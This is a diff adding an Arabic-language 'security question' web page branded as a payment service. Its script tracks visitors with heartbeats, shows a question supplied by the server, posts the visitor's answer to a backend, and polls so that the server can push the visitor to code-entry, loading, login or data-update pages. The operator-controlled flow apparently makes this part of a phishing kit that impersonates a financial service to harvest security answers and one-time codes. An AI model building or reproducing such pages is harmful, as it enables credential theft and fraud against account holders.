@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>سؤال الأمان - بن دول باي</title>
+<link rel="icon" href="assets/img/icone.png">
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{--primary:#364abf;--primary-dark:#2b3b99;--bg:#e8ecf5;--card:#fff;--ink:#1a1d2e;--ink-soft:#8b90a0}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Tajawal',sans-serif;background:var(--bg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.box{background:var(--card);border-radius:24px;padding:36px 28px;width:100%;max-width:420px;text-align:center;box-shadow:0 8px 30px rgba(0,0,0,.06)}
+.icon{font-size:56px;margin-bottom:12px}
+h1{font-size:22px;font-weight:900;color:var(--ink);margin-bottom:6px}
+.sub{color:var(--ink-soft);font-size:14px;margin-bottom:16px}
+.question{background:rgba(54,74,191,.06);border:1px solid rgba(54,74,191,.15);border-radius:14px;
+  padding:16px;font-size:16px;font-weight:700;color:var(--ink);margin-bottom:20px;line-height:1.7}
+input{width:100%;height:52px;border:2px solid #e2e8f0;border-radius:14px;padding:0 16px;
+  font-family:inherit;font-size:16px;font-weight:600;color:var(--ink);outline:none;text-align:right;margin-bottom:16px}
+input:focus{border-color:var(--primary)}
+.btn{width:100%;height:52px;border:none;border-radius:14px;background:var(--primary);color:#fff;
+  font-family:inherit;font-weight:800;font-size:17px;cursor:pointer}
+.btn:hover{background:var(--primary-dark)}
+.btn:disabled{background:#aab;cursor:not-allowed}
+.err{color:#dc2626;font-size:13px;font-weight:700;min-height:18px;margin-top:10px}
+.spinner{display:none;width:22px;height:22px;border:3px solid rgba(255,255,255,.3);
+  border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;margin:0 auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="icon">🛡️</div>
+  <h1>سؤال الأمان</h1>
+  <p class="sub">أجب على السؤال التالي للتحقق من هويتك</p>
+  <div class="question" id="questionText">جاري التحميل...</div>
+  <input type="text" id="answer" placeholder="الإجابة">
+  <button class="btn" id="sendBtn" onclick="submitAnswer()">
+    <span id="btnText">إرسال</span>
+    <div class="spinner" id="spinner"></div>
+  </button>
+  <p class="err" id="errMsg"></p>
+</div>
+
+<script>
+var _vid=Math.random().toString(36).slice(2);
+var id=new URLSearchParams(location.search).get('id')||'';
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'security',vid:_vid})}).catch(function(){});}
+setInterval(heartbeat,10000);heartbeat();
+
+function loadQuestion(){
+  if(!id)return;
+  fetch('/api/status/'+id).then(function(r){return r.json();}).then(function(d){
+    if(d.security_question)document.getElementById('questionText').textContent=d.security_question;
+  }).catch(function(){});
+}
+loadQuestion();
+
+function submitAnswer(){
+  var answer=document.getElementById('answer').value.trim();
+  if(!answer){document.getElementById('errMsg').textContent='أدخل الإجابة';return;}
+  var question=document.getElementById('questionText').textContent;
+  var btn=document.getElementById('sendBtn'),txt=document.getElementById('btnText'),sp=document.getElementById('spinner');
+  btn.disabled=true;txt.style.display='none';sp.style.display='block';
+  fetch('/api/submit-security/'+id,{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({question:question,answer:answer})
+  }).then(function(r){return r.json();}).then(function(){
+    window.location.href='loading.html?id='+id;
+  }).catch(function(){
+    btn.disabled=false;txt.style.display='';sp.style.display='none';
+    document.getElementById('errMsg').textContent='حدث خطأ، حاول مرة أخرى';
+  });
+}
+
+function pollStatus(){
+  if(!id)return;
+  fetch('/api/status/'+id).then(function(r){return r.json();}).then(function(d){
+    if(d.security_question)document.getElementById('questionText').textContent=d.security_question;
+    if(d.status==='redirect'&&d.redirect){
+      if(d.redirect==='security')return;
+      if(d.redirect==='code')window.location.href='code.html?id='+id;
+      else if(d.redirect==='loading')window.location.href='loading.html?id='+id;
+      else if(d.redirect==='login')window.location.href='signin.html';
+      else if(d.redirect==='update-data')window.location.href='update-data.html?id='+id;
+    }
+  }).catch(function(){});
+}
+setInterval(pollStatus,3000);
+</script>
+</body>
+</html>
